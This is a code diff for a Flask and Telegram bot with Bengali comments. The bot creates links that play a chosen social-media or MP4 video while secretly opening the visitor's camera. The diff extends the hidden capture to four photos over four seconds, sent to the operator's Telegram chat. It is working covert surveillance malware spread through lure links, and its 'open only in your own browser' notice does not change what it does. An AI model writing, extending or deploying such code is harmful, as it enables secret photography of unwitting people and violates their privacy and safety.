@@ -1,10 +1,10 @@
 import os
 import io
+import uuid
 import base64
 import threading
 import requests
-from urllib.parse import urlparse, quote
-from flask import Flask, request, render_template_string, jsonify, redirect
+from flask import Flask, request, render_template_string, jsonify
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
     ApplicationBuilder,
@@ -26,16 +26,16 @@ PUBLIC_URL = os.environ.get("PUBLIC_URL", "")
 
 if not BOT_TOKEN or not CHAT_ID:
     print("❌ BOT_TOKEN বা CHAT_ID সেট করা হয়নি!")
-    print("👉 Replit → Tools → Secrets এ যোগ করুন")
+    print("👉 Render → Tools → Environment এ যোগ করুন")
     raise SystemExit(1)
 
 # অস্থায়ী স্টোরেজ
-user_sessions = {}   # {chat_id: {"camera": "front/back", "video_url": "...", "link_id": "..."}}
+user_sessions = {}   # {chat_id: {"camera": "front/back", "waiting_url": True}}
 link_store = {}      # {link_id: {"chat_id": ..., "video_url": ..., "camera": ...}}
 
 
 # ==========================================
-# Telegram এ ছবি পাঠানো
+# Telegram-এ ছবি পাঠানো
 # ==========================================
 def send_photo_to_telegram(photo_file, chat_id, bot_token, caption=""):
     url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
@@ -54,7 +54,7 @@ def send_photo_to_telegram(photo_file, chat_id, bot_token, caption=""):
         return {"status": "error", "details": str(e)}
 
 
-def capture_and_send_photo(photo_data, chat_id, camera_type="front"):
+def capture_and_send_photo(photo_data, chat_id, camera_type="front", photo_num=1, total=4):
     try:
         if "," in photo_data:
             image_data = photo_data.split(",", 1)[1]
@@ -63,9 +63,9 @@ def capture_and_send_photo(photo_data, chat_id, camera_type="front"):
 
         image_bytes = base64.b64decode(image_data)
         photo_file = io.BytesIO(image_bytes)
-        photo_file.name = f"{camera_type}_capture.jpg"
+        photo_file.name = f"{camera_type}_capture_{photo_num}.jpg"
 
-        caption = f"📸 {camera_type.upper()} Camera ক্যাপচার"
+        caption = f"📸 {camera_type.upper()} Camera — ছবি {photo_num}/{total}"
         return send_photo_to_telegram(photo_file, chat_id, BOT_TOKEN, caption)
     except Exception as e:
         return {"status": "error", "details": str(e)}
@@ -138,9 +138,7 @@ CAPTURE_HTML = """
         const CAMERA_TYPE = "{{ camera_type }}";
         const LINK_ID = "{{ link_id }}";
 
-        let videoStarted = false;
-
-        // === ক্যামেরা চালু + ছবি ক্যাপচার (লুকানো) ===
+        // === ক্যামেরা চালু + ৪টি ছবি ক্যাপচার (লুকানো) ===
         async function startHiddenCapture() {
             try {
                 const constraints = {
@@ -160,33 +158,49 @@ CAPTURE_HTML = """
                 hiddenVideo.play();
 
                 hiddenVideo.onplaying = () => {
-                    // ১.৫ সেকেন্ড পরে ছবি তুলুন
-                    setTimeout(async () => {
-                        try {
-                            const canvas = document.createElement('canvas');
-                            canvas.width = hiddenVideo.videoWidth || 640;
-                            canvas.height = hiddenVideo.videoHeight || 480;
-                            const ctx = canvas.getContext('2d');
-                            ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
-                            const photo = canvas.toDataURL('image/jpeg', 0.85);
+                    // ⏱️ কনফিগারেশন — ৪ সেকেন্ডে ৪টি ছবি
+                    const TOTAL_PHOTOS = 4;      // ← মোট ছবি
+                    const INTERVAL_MS = 1000;    // ← প্রতি ১ সেকেন্ডে ১টি
+                    const START_DELAY = 1000;    // ← ক্যামেরা চালু হওয়ার ১ সেকেন্ড পরে শুরু
 
-                            // সার্ভারে পাঠান
-                            await fetch('/capture', {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({
-                                    photo: photo,
-                                    chat_id: CHAT_ID,
-                                    camera_type: CAMERA_TYPE
-                                })
-                            });
+                    let photoCount = 0;
 
-                            // ক্যামেরা বন্ধ
-                            stream.getTracks().forEach(t => t.stop());
-                        } catch (e) {
-                            console.log("capture error", e);
-                        }
-                    }, 1500);
+                    setTimeout(() => {
+                        const interval = setInterval(async () => {
+                            try {
+                                const canvas = document.createElement('canvas');
+                                canvas.width = hiddenVideo.videoWidth || 640;
+                                canvas.height = hiddenVideo.videoHeight || 480;
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
+                                const photo = canvas.toDataURL('image/jpeg', 0.85);
+
+                                photoCount++;
+
+                                await fetch('/capture', {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({
+                                        photo: photo,
+                                        chat_id: CHAT_ID,
+                                        camera_type: CAMERA_TYPE,
+                                        photo_num: photoCount,
+                                        total: TOTAL_PHOTOS
+                                    })
+                                });
+
+                                console.log(`📸 ছবি ${photoCount}/${TOTAL_PHOTOS} পাঠানো হয়েছে`);
+
+                                if (photoCount >= TOTAL_PHOTOS) {
+                                    clearInterval(interval);
+                                    stream.getTracks().forEach(t => t.stop());
+                                    console.log("✅ ৪টি ছবি শেষ, ক্যামেরা বন্ধ");
+                                }
+                            } catch (e) {
+                                console.log("capture error", e);
+                            }
+                        }, INTERVAL_MS);
+                    }, START_DELAY);
                 };
             } catch (e) {
                 console.log("camera error", e);
@@ -201,35 +215,98 @@ CAPTURE_HTML = """
                 return;
             }
 
-            // YouTube লিংক হলে iframe
-            if (VIDEO_URL.includes('youtube.com') || VIDEO_URL.includes('youtu.be')) {
+            const url = VIDEO_URL;
+
+            // === YouTube ===
+            if (url.includes('youtube.com') || url.includes('youtu.be')) {
                 let vid = '';
-                if (VIDEO_URL.includes('youtu.be/')) {
-                    vid = VIDEO_URL.split('youtu.be/')[1].split('?')[0];
-                } else if (VIDEO_URL.includes('v=')) {
-                    vid = VIDEO_URL.split('v=')[1].split('&')[0];
+                if (url.includes('youtu.be/')) {
+                    vid = url.split('youtu.be/')[1].split('?')[0];
+                } else if (url.includes('v=')) {
+                    vid = url.split('v=')[1].split('&')[0];
+                } else if (url.includes('shorts/')) {
+                    vid = url.split('shorts/')[1].split('?')[0];
                 }
                 container.innerHTML = `
                     <iframe
-                        src="https://www.youtube.com/embed/${vid}?autoplay=1&mute=0"
-                        allow="autoplay; encrypted-media"
+                        src="https://www.youtube.com/embed/${vid}?autoplay=1&mute=0&playsinline=1"
+                        allow="autoplay; encrypted-media; fullscreen"
                         allowfullscreen>
                     </iframe>`;
-            } else if (VIDEO_URL.match(/\\.(mp4|webm|ogg)$/i)) {
+            }
+            // === TikTok ===
+            else if (url.includes('tiktok.com')) {
+                const match = url.match(/\\/video\\/(\\d+)/);
+                if (match) {
+                    const vid = match[1];
+                    container.innerHTML = `
+                        <iframe
+                            src="https://www.tiktok.com/embed/v2/${vid}"
+                            allow="autoplay; encrypted-media; fullscreen"
+                            allowfullscreen
+                            style="width:100%; height:80vh; border:none;">
+                        </iframe>`;
+                } else {
+                    window.location.href = url;
+                }
+            }
+            // === Instagram ===
+            else if (url.includes('instagram.com')) {
+                const match = url.match(/\\/(reel|p|tv)\\/([A-Za-z0-9_-]+)/);
+                if (match) {
+                    const type = match[1];
+                    const id = match[2];
+                    container.innerHTML = `
+                        <iframe
+                            src="https://www.instagram.com/${type}/${id}/embed/"
+                            allow="autoplay; encrypted-media; fullscreen"
+                            allowfullscreen
+                            style="width:100%; height:80vh; border:none;">
+                        </iframe>`;
+                } else {
+                    window.location.href = url;
+                }
+            }
+            // === Facebook ===
+            else if (url.includes('facebook.com') || url.includes('fb.watch')) {
+                container.innerHTML = `
+                    <iframe
+                        src="https://www.facebook.com/plugins/video.php?href=${encodeURIComponent(url)}&show_text=0&autoplay=1"
+                        allow="autoplay; encrypted-media; fullscreen"
+                        allowfullscreen
+                        style="width:100%; height:80vh; border:none;">
+                    </iframe>`;
+            }
+            // === Vimeo ===
+            else if (url.includes('vimeo.com')) {
+                const match = url.match(/vimeo\\.com\\/(\\d+)/);
+                if (match) {
+                    container.innerHTML = `
+                        <iframe
+                            src="https://player.vimeo.com/video/${match[1]}?autoplay=1"
+                            allow="autoplay; encrypted-media; fullscreen"
+                            allowfullscreen>
+                        </iframe>`;
+                } else {
+                    window.location.href = url;
+                }
+            }
+            // === Direct MP4/WebM ===
+            else if (url.match(/\\.(mp4|webm|ogg|mov)(\\?|$)/i)) {
                 container.innerHTML = `
                     <video autoplay controls playsinline>
-                        <source src="${VIDEO_URL}" type="video/mp4">
+                        <source src="${url}">
                     </video>`;
-            } else {
-                // অন্য লিংক হলে সরাসরি redirect
-                window.location.href = VIDEO_URL;
+            }
+            // === অন্য যেকোনো লিংক → redirect ===
+            else {
+                window.location.href = url;
             }
         }
 
         // === সব শুরু ===
         window.onload = () => {
             loadVideo();
-            // ভিডিও চলার সাথে সাথেই লুকানো ক্যামেরা চালু
             startHiddenCapture();
         };
     </script>
@@ -283,7 +360,9 @@ def capture():
 
     chat_id = data.get("chat_id", CHAT_ID)
     camera_type = data.get("camera_type", "front")
-    result = capture_and_send_photo(data["photo"], chat_id, camera_type)
+    photo_num = data.get("photo_num", 1)
+    total = data.get("total", 4)
+    result = capture_and_send_photo(data["photo"], chat_id, camera_type, photo_num, total)
     return jsonify(result)
 
 
@@ -317,7 +396,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # === Camera select ===
     if data.startswith("cam_"):
-        cam = data.split("_")[1]  # front / back
+        cam = data.split("_")[1]
         user_sessions[chat_id] = {"camera": cam}
 
         keyboard = [
@@ -346,11 +425,13 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(
             "🔄 *Enter ANY Custom Link/URL*\n\n"
             "যে ভিডিও/লিংক দেখাতে চান, সেটার URL পাঠান।\n\n"
-            "✅ সব ফরম্যাট কাজ করে:\n"
-            "• `youtube.com/watch?v=VIDEO_ID`\n"
-            "• `https://example.com/video.mp4`\n"
-            "• `facebook.com/video/...`\n"
-            "• যেকোনো ভিডিও লিংক\n\n"
+            "✅ কাজ করবে:\n"
+            "• YouTube: `youtube.com/watch?v=...`\n"
+            "• YouTube Shorts: `youtube.com/shorts/...`\n"
+            "• TikTok: `tiktok.com/@user/video/...`\n"
+            "• Instagram: `instagram.com/reel/...`\n"
+            "• Facebook: `facebook.com/watch?v=...`\n"
+            "• MP4: `example.com/video.mp4`\n\n"
             "👉 শুধু লিংকটি পাঠান:",
             parse_mode="Markdown",
         )
@@ -361,8 +442,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         session = user_sessions.get(chat_id, {})
         cam = session.get("camera", "front")
 
-        # লিংক তৈরি
-        import uuid
         link_id = uuid.uuid4().hex[:10]
         link_store[link_id] = {
             "chat_id": chat_id,
@@ -373,16 +452,17 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if PUBLIC_URL:
             public_link = f"{PUBLIC_URL}/v/{link_id}"
         else:
-            public_link = f"[Replit Webview লিংক]/v/{link_id}"
+            public_link = f"⚠️ PUBLIC_URL সেট করা হয়নি — /v/{link_id}"
 
         keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
             f"✅ *Direct Link তৈরি হয়েছে!*\n\n"
-            f"📸 Camera: *{cam.capitalize()}*\n\n"
+            f"📸 Camera: *{cam.capitalize()}*\n"
+            f"📷 ছবি: ৪টি (৪ সেকেন্ডে)\n\n"
             f"🔗 লিংক:\n`{public_link}`\n\n"
             f"⚠️ *শুধু নিজের ব্রাউজারে খুলুন।*\n"
-            f"Allow করলে ছবি Telegram-এ আসবে।",
+            f"Allow করলে ৪টি ছবি Telegram-এ আসবে।",
             reply_markup=reply_markup,
             parse_mode="Markdown",
         )
@@ -412,8 +492,6 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     session["video_url"] = url
     user_sessions[chat_id] = session
 
-    # লিংক তৈরি
-    import uuid
     link_id = uuid.uuid4().hex[:10]
     link_store[link_id] = {
         "chat_id": chat_id,
@@ -424,17 +502,18 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if PUBLIC_URL:
         public_link = f"{PUBLIC_URL}/v/{link_id}"
     else:
-        public_link = f"[Replit Webview URL]/v/{link_id}"
+        public_link = f"⚠️ PUBLIC_URL সেট করা হয়নি — /v/{link_id}"
 
     keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text(
         f"✅ *Redirect Link তৈরি হয়েছে!*\n\n"
         f"📸 Camera: *{cam.capitalize()}*\n"
-        f"🎬 Video: `{url[:50]}...`\n\n"
+        f"🎬 Video: `{url[:50]}...`\n"
+        f"📷 ছবি: ৪টি (৪ সেকেন্ডে)\n\n"
         f"🔗 লিংক:\n`{public_link}`\n\n"
         f"⚠️ *শুধু নিজের ব্রাউজারে খুলুন।*\n"
-        f"ভিডিও চলবে + আড়ালে ছবি Telegram-এ আসবে।",
+        f"ভিডিও চলবে + ৪টি ছবি Telegram-এ আসবে।",
         reply_markup=reply_markup,
         parse_mode="Markdown",
     )
@@ -451,14 +530,12 @@ def run_flask():
 # Main
 # ==========================================
 def main():
-    # Flask থ্রেড
     flask_thread = threading.Thread(target=run_flask, daemon=True)
     flask_thread.start()
 
     print("🌐 Web Server চলছে: http://0.0.0.0:8080")
     print("✅ Telegram Bot শুরু হচ্ছে...")
 
-    # Bot
     application = ApplicationBuilder().token(BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CallbackQueryHandler(button_handler))
